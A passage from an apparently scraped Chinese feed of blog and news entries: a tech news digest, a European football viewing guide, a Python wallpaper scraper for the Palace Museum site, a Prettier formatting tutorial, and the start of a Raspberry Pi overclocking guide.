src=\"https://cdn.sspai.com/2021/09/09/article/2bfe95ba2a004db65f0dd34f5b2997ca\"><figcaption>图片来自新闻源</figcaption></figure><h3>微软收购浏览器视频编辑服务 Clipchamp</h3>\n<p>微软于 9 月 8 日正式对外宣布，已经完成了对基于浏览器的视频编辑服务 Clipchamp 的收购，在新闻稿中微软表示，Clipchamp 结合了 web 服务的简单性以及 PC 强大的 GPU 加速能力，可以为非专业工作者带来「过去仅限专业视频编辑软件才能拥有的能力」。微软目前尚未确认 Clipchamp 是否会继续独立运营，但据悉微软将推出将现有 Clipchamp 用户转换为微软订阅用户的新机制。<a href=\"https://cn.engadget.com/microsoft-acquires-clipchamp-110055319.html\" target=\"_blank\">来源</a></p>\n<h3>华为将召开智慧办公新品发布会</h3>\n<p>9 月 8 日，华为对外公布了新品发布会的时间和主题。本次发布会主要发布和智慧办公相关的新品，定于 9 月 13 日举行。有媒体报道称，华为智能打印机将在本次发布会上亮相。<a href=\"https://tech.ifeng.com/c/89Mf8neVHEi\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/09/article/4435cdad12d19d5ddfbb5d3d7b31a1ed\"><figcaption>图片来自新闻源</figcaption></figure><h3>Android 12 推送 beta 5 更新</h3>\n<p>Google 已经向升级了 Android 12 的设备推送了第五个 beta 版的系统更新，更新内容包含锁屏介面新增设备控制快捷方式、Pixel Launcher 更加迅捷、增加计算核心隐私设置以及多款内置应用 UI 升级等。<a href=\"https://www.xda-developers.com/android-12-beta-5-changelog/\" target=\"_blank\">来源</a></p>\n<h3>字节跳动推出《悟空浏览器》</h3>\n<p>字节跳动近日推出一款主打赚钱功能并面向下沉市场的《悟空浏览器》，该浏览器基于个性化算法，打造集免费小说、内容视频和图文资讯为一体的浏览器平台，支持设置为默认浏览器，用户可以通过浏览图文、观看视频方式获取金币，达到一定额度之后可以进行支付宝提现操作。<a href=\"https://tech.ifeng.com/c/89MhftUJruA\" target=\"_blank\">来源</a></p>\n<h3>特斯拉本年度销量已超过去年总和</h3>\n<p>9 月 8 日，乘联会公布了中国汽车销量数据。据数据显示，8 月特斯拉批发销量创造了历史最好成绩，达到 44,264 辆，环比增长 34%，同比增长 275%。截至 8 月，特斯拉 2021 年累计销售超过 25 万辆，其中仅国内销量就已达到 152,531 辆，超越去年全年的整体销量。</p>\n<h3>《鬼灭之刃·花街篇》确认秋冬档上线</h3>\n<p>9 月 6 日，富士电视台宣布 TV 动画《鬼灭之刃》的第二季「花街篇」将于今年秋冬档的周日晚 10 点 15 分（北京时间）播出。富士电视台将于 9 月 25 日继续公布有关「花街篇」的后续情报。<a href=\"https://www.gcores.com/articles/141317\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/09/article/a36c58eb311b7cb2e5f39634e6a75c6a\"><figcaption>图片来自新闻源</figcaption></figure><h2>看看就行的小道消息</h2>\n<ul><li>近日，有消息称抖音旗下的独立电商 app 将于 10 月份正式上线，该项目由抖音电商总裁康泽宇负责推动。<a href=\"https://tech.ifeng.com/c/89MxLei34Kl\" target=\"_blank\">来源</a>\n</li></ul>\n<h2><strong>少数派的近期动态</strong></h2>\n<ul>\n<li>📓 少数派会员通讯《<a href=\"https://sspai.com/prime/precog/vol07-pre-talk-about-notes\" target=\"_blank\">笔记大战</a>》已经上线，来看看他们的笔记工具方法论吧！</li>\n<li>🎁 会员周边将于即日起<strong>陆续</strong>发货，敬请期待。</li>\n<li>🎉 少数派正版软件商城 <a href=\"https://sspai.com/mall/discount/%E5%BC%80%E5%AD%A6%E5%AD%A3%E4%BF%83%E9%94%80\" target=\"_blank\">开学季促销</a> 开启，数十款优质软件低至 5 折起。</li>\n<li>📡 你会在日常生活中使用 5G 网络吗？去 <a href=\"https://sspai.com/bullet/1630048406\" target=\"_blank\">一派</a> 和大家聊聊。</li>\n<li>📕 由少数派编辑部联合优秀作者出版实体书《数字时代的效率手册》上线电商平台，立即前往 <a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单</a>。</li>\n</ul>\n<h2>你可能错过的好文章</h2>\n<ul>\n<li>💰 <a href=\"https://sspai.com/post/68647\" target=\"_blank\">开学季到来，为你推荐这 10+ 款数码 / 生活实用好物</a>\n</li>\n<li>🛠 <a href=\"https://sspai.com/post/68646\" target=\"_blank\">舍不得旧手机，那就做个标本吧</a>\n</li>\n<li>🎤 <a href=\"https://sspai.com/post/68640\" target=\"_blank\">在 Google 浇灌创新文化——专访 Google 首席文化官 Stacy Sullivan</a>\n</li>\n<li>🍎 <a href=\"https://sspai.com/post/68644\" target=\"_blank\">高刷屏 iPhone、全面屏 iPad mini…… Apple 秋季发布会还有哪些看点？</a>\n</li>\n<li>🎧 <a href=\"https://sspai.com/post/68651\" target=\"_blank\">一派·在线沙龙 02：个人知识管理，你做对了吗？</a>\n</li>\n<li>⚽ <a href=\"https://sspai.com/post/68613\" target=\"_blank\">2021–2022 新赛季欧洲足球联赛观看指南</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68662"},{"title":"2021–2022 赛季欧洲足球联赛观看指南","date":"2021-09-08 09:29:15","description":"\n<p>注：封面图来自 The Ringer</p>\n<h2>火热的新赛季，从热闹的转会开始</h2>\n<p>踩着 8 月份的尾巴，欧洲足球联赛纷纷拉开了新赛季的序幕。8 月 27 日，欧冠联赛小组赛阶段抽签尘埃落定；9 月 1 日，五大联赛转会窗口的关闭，热闹了一个夏天的转会市场，终于暂时的安静了下来。受新冠疫情影响空场了半年多的体育场，终于迎回了受限制人数的球迷的主场观战。</p>\n<p>新赛季的足球比赛还没开始，转会窗口的各种疯狂操作就已经成为了让球迷们热议的谈资。谁都没能想到，在疫情还在持续影响经济的 2021 年，足坛「绝代双骄」居然可以在同一个转会期更换东家，「离家」和「回家」也成了这个夏天的主旋律。</p>\n<p>2000 年，年仅 13 岁的梅西（Lionel Messi）来到巴塞罗那，在一张餐巾纸上签下了第一份足球合约。21 年后，巴塞罗那俱乐部因为经济原因无法与梅西完成续约，梅西在合同到期后，不得不泪洒发布会，宣布告别巴塞罗那队。随后，巴黎圣日耳曼俱乐部宣布了梅西加盟的消息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/f3bd7f972e3fc6ab26e3456e624a764e.jpg\"><figcaption>梅西加盟 PSG，图片来自法甲联赛</figcaption></figure><p>2003 年，意气风发的小小罗（Cristiano Ronaldo）登陆老特拉福德，接过了代表着传奇的 7 号球衣。在皇马和尤文兜兜转转了 12 年之后，如今已贵为「总裁」的 C 罗重新回到曼联，回到梦开始的地方。时过境迁，已经 36 岁的 C 罗重新披上了红魔 7 号战袍，却不知归来是否仍少年？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/16d2f0b0d4af38dbd8f45f50c712b48a.jpg\"><figcaption>C 罗重披红魔 7 号，图片来自 TNT Sports</figcaption></figure><p>在足坛两大巨星引发的地震般的动荡中，新赛季的欧洲足球联赛开始了。</p>\n<h2>看球之前，先来聊聊关于足球联赛的小知识</h2>\n<p>看到上面这段略带唏嘘的引子，新球迷们可能对于其中的足坛黑话还不甚明白，觉得云里雾里。在正式介绍新赛季观球方案之前，我们还是先来谈谈关于欧洲足球联赛的小知识。</p>\n<h3>足球联赛是什么？和世界杯有何不同？</h3>\n<p>不同于世界杯或洲际杯（比如欧洲杯、美洲杯、亚洲杯等）等 N 年一届的赛会制比赛，各国的足球联赛基本都由本国足球协会筹办，每年都会举行。参与联赛的队伍也不是国家队，而是由职业足球运动员组成的俱乐部队，球迷们常说的皇马、曼联、巴萨、拜仁等都是足球俱乐部。</p>\n<p>欧洲联赛的开赛时间通常为当年的 8 月到次年的 5 月，即一个完整的「赛季」，本文所指的「新赛季」观赛指南，指的就是 2021–2022 赛季。由于欧洲足球联赛的整体水平高，且汇集了全世界最好的球员、教练及足球从业者，因此，观看欧洲各国的足球联赛就成了球迷们「看球」的默认语境。</p>\n<p>在欧洲足球联赛中，又以广大中国球迷熟悉的「五大联赛」最为知名。「五大联赛」指的是欧洲五个国家的顶级足球联赛，分别是英国的英格兰足球超级联赛（English Premier League）、西班牙足球甲级联赛（España La Liga）、德国足球甲级联赛（Bundesliga）、意大利足球甲级联赛（Italia Lega Serie A）和法国足球甲级联赛（France Ligue 1）。</p>\n<p>不过，今年的情况有些特别，根据最新的欧足联系数，葡萄牙超过了法国，雄踞第五，葡萄牙超级联赛（Portugal Primeira Liga）也因此将法甲挤出了五大联赛的行列——世界巨星梅西在泪别母队之后，居然加盟了一支非五大联赛的球队（笑）。</p>\n<p>所谓 <a href=\"https://www.uefa.com/memberassociations/uefarankings/country/#/yr/2022\" target=\"_blank\">欧足联系数</a>，是欧洲足球联合会联盟（UEFA）每年都会发布的数据排名。其中，欧足联会统计过去五年各国俱乐部在欧洲赛事的成绩并折算成分数，进而得出当年的国家联赛名次。这个名次不仅决定了「谁是『五大联赛』」这么简单，它还直接关系到每个国家有几支俱乐部可以参与欧冠联赛等赛事。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/56e7c310fe2666377212463a177e23b8.png\"><figcaption>今年的欧足联「男子国家系数」排名，葡萄牙力压法国，晋升「五大联赛」之列</figcaption></figure><p>各国的足球联赛都采用主客场积分制，即所有参赛球队要两两对战，并各自到对方的球场踢球（即所谓的「主客场」）。每场比赛都不设加时赛和点球大战，获胜的队伍获得 3 分，打平了话双方各加 1 分，输了的球队则没有积分入账（0 分）。赛季结束后，积分最高的队伍将获得联赛冠军，如果有积分相同的，则根据各国联赛的规则，比较同分队伍的胜负关系等数据决定冠军的归属。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/bd49f4961a00cd7136858e879acf2e29.png\"><figcaption>每个联赛都会有一个积分榜（Tables），在全部完成两两对决后，积分榜上得分最高的球队就是当季冠军</figcaption></figure><h3>除了足球联赛，还有欧冠和欧联</h3>\n<p>在各国举办足球联赛的同期，欧足联还会组织各国俱乐部共同参加欧洲冠军联赛（简称「欧冠」）和欧足联欧洲联赛（简称「欧联」）。由于欧冠和欧联汇集了来自欧洲各国最强的俱乐部，所以比赛的精彩和激烈程度很高，能够赢得欧冠奖杯也被视为足球俱乐部的最高荣誉。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/9f33962ae5732efceea10a1564041719.png\"><figcaption>各国联赛与欧冠、欧联的关系：最好的球队去欧冠，其次好的去欧联。图片仅为示意，各国实际参与欧冠及欧联的俱乐部数量视当年欧足联系数排名而定</figcaption></figure><p>和联赛的赛制略有不同，欧冠和欧联的比赛会分为「小组赛」和「淘汰赛」两个阶段，所有参加比赛的球队会被分成小组，小组赛阶段采用积分制，每个小组最高的前两名出线，重新抽签后进入淘汰赛阶段。淘汰赛阶段的每一场较量都是一主一客的两场比赛，以进球决定胜负（如果进球数相同，则对比客场进球数）。</p>\n<p>进入决赛后，两支队伍将会在一个中立场地一场定胜负，赢球的队伍就能捧得奖杯。</p>\n<h2>去哪儿能看到比赛</h2>\n<h3>看球平台</h3>\n<p>如果想快速的找到收看各大欧洲联赛的平台，收藏和参考以下这张表格即可（末尾有中超乱入）。</p>\n<figure class=\"table\"><table>\n<thead><tr>\n<th>联赛</th>\n<th>收看平台</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>英超</td>\n<td>咪咕视频、爱奇艺体育</td>\n</tr>\n<tr>\n<td>西甲</td>\n<td>咪咕视频、爱奇艺体育</td>\n</tr>\n<tr>\n<td>德甲</td>\n<td>咪咕视频、腾讯体育、虎牙直播、懂球帝</td>\n</tr>\n<tr>\n<td>法甲</td>\n<td>咪咕视频</td>\n</tr>\n<tr>\n<td>意甲</td>\n<td>咪咕视频</td>\n</tr>\n<tr>\n<td>葡超</td>\n<td>腾讯体育</td>\n</tr>\n<tr>\n<td>苏超（苏格兰超级联赛）</td>\n<td>腾讯体育</td>\n</tr>\n<tr>\n<td>土超（土耳其超级联赛）</td>\n<td>腾讯体育</td>\n</tr>\n<tr>\n<td>荷甲（荷兰足球甲级联赛）</td>\n<td>腾讯体育</td>\n</tr>\n<tr>\n<td>欧冠</td>\n<td>咪咕视频、腾讯体育、爱奇艺体育、PP 体育</td>\n</tr>\n<tr>\n<td>欧联</td>\n<td>咪咕视频、腾讯体育、爱奇艺体育、PP 体育</td>\n</tr>\n<tr>\n<td>中超</td>\n<td>咪咕视频、腾讯体育、懂球帝</td>\n</tr>\n</tbody>\n</table></figure><p>以上列举了知名欧洲联赛在中国大陆的收看方式，如果各联赛中有你关注的球队和球星，只需要根据表格内容到对应平台查询直播安排即可。</p>\n<h3>会员和增值服务</h3>\n<p>当然，熟悉体育赛事直播的朋友都知道，各平台转播足球联赛需要缴纳转播费，而球迷看球也要支付相应的费用。但对于不同平台和不同联赛，付费的方案也各不相同。</p>\n<h4>咪咕视频：支持按场次观看</h4>\n<p>新赛季咪咕视频一骑绝尘，拿下了五大联赛的所有转播权，而且咪咕视频开辟了新的付费玩法——通看券。通看券可以用来兑换单场赛事直播，也可以用来兑换其它热播影视和剧集，或者 UCL 等其它体育直播场次，价格为 15 元包月（内含 10 张通看券）和 30 元包月（内含 30 张通看券）两种。除了按月付费之外，咪咕的通用券包还提供按季度付费和按次加油包。对于没时间看完赛季全程，只想看重大比赛的球迷来说，这种收费方式非常友好。</p>\n<p>不过，想要享受到 1080p 的画质，则需要先开通咪咕视频的钻石会员，其收费如下图所示:</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/04/daf761712b8d28236f5ab1428cdaa7aa.jpg\"><figcaption>咪咕视频钻石会员收费</figcaption></figure><h4>爱奇艺：经典的「包赛季」模式</h4>\n<p>爱奇艺体育的付费方式仍是经典的「包赛季」模式——支付一定的费用后即可观看某个联赛的全部直播场次，目前已经推出了 238 元的「英超全季通」和「西甲全季通」。开通全季通服务后，球迷可享受 1080p 50 帧的高清直播。如果想要更划算地观看所有爱奇艺赛事，还可以考虑购买 318 元的足球年卡，包含英超、西甲、欧冠、亚冠、世亚预 12 强赛等比赛。</p>\n<h4>腾讯体育：熟悉的「QQ 会员」模式</h4>\n<p>腾讯体育的收费策略分为体育 VIP 和体育超级 VIP 两档会员，目前连续包月价格分别为 25 每月和 60 元每月。二者在内容上的区别主要在于是否包含 F1、NHL 等其它赛事直播，以及观看直播赛事时是否扣除每个月数量有限的观赛券等。</p>\n<p>腾讯体育的核心竞争力在于 NBA 直播，此外，部分较为冷门的欧洲足球联赛——如苏超、土超、荷甲等——均在腾讯体育可以收看。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/04/b327c2a9a87650c6d64f37a04e4b96f5.jpg\"><figcaption>左👈图为爱奇艺，右👉图为腾讯体育</figcaption></figure><p>而对于德甲的球迷来说，由于虎牙直播和懂球帝则都提供免费的赛事直播，所以专门为它购买腾讯体育 VIP 并不划算。另外，腾讯平台还会免费播放 21–22 赛季欧冠和欧联的全场次比赛。</p>\n<h3>不同平台，不同解说</h3>\n<p>在价格和平台之外，部分球迷还有自己独特中意的解说风格，下表就总结了各平台签约的主要足球解说员，他们的声音会在接下来的一个赛季中与你相伴：</p>\n<figure class=\"table\"><table><tbody>\n<tr>\n<td><strong>视频平台</strong></td>\n<td><strong>解说嘉宾</strong></td>\n</tr>\n<tr>\n<td>咪咕视频</td>\n<td>詹俊、张路、黄健翔、娄一晨、刘越、李欣、梁祥宇、刘焕、贺宇、徐阳、苗锟等</td>\n</tr>\n<tr>\n<td>爱奇艺</td>\n<td>苏东、金相凯、刘晶捷、于鑫淼等</td>\n</tr>\n<tr>\n<td>腾讯体育</td>\n<td>颜强、徐亮、杨晨等</td>\n</tr>\n</tbody></table></figure><h2>比赛以外，狂欢继续</h2>\n<p>当你入坑成了一名地道的足球迷，光看比赛直播肯定不够过瘾。看完自己心爱的球队的比赛，不管场面荡气回肠还是平淡无奇，都会想着找人聊聊。虽然你周围或许没有同好的小伙伴，单互联网给我们提供了交流的平台。</p>\n<p>国内目前人气最高的足球社区是懂球帝和虎扑，而懂球帝完全专注于足球领域。球迷可以关注自己感兴趣的球队、联赛和球星，像刷抖音一样刷一刷他们的最新消息。此外，OneFootball 也是一款不错的足球动态追踪工具，订阅主队之后，比赛开始以及比赛中重要的赛况（进球、红黄牌等）会实时推送。</p>\n<ul><li>关联阅读：《<a href=\"https://sspai.com/post/63948\" target=\"_blank\">没时间看比赛直播？你可以用这些方式追踪球队和球星动态</a>》</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/04/df4cb39cb94ea925990d2b4e122059c5.jpg\"></figure><h2>最后</h2>\n<p>热爱足球的方式有很多种，在文章的最后，我还想给各位一个大胆的建议：买一双足球鞋，走上球场吧。自己去踢球，不仅能锻炼身体，还会认识很多很多的朋友。</p>\n<p>祝你看球开心，踢球开心。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n","link":"https://sspai.com/post/68613"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span 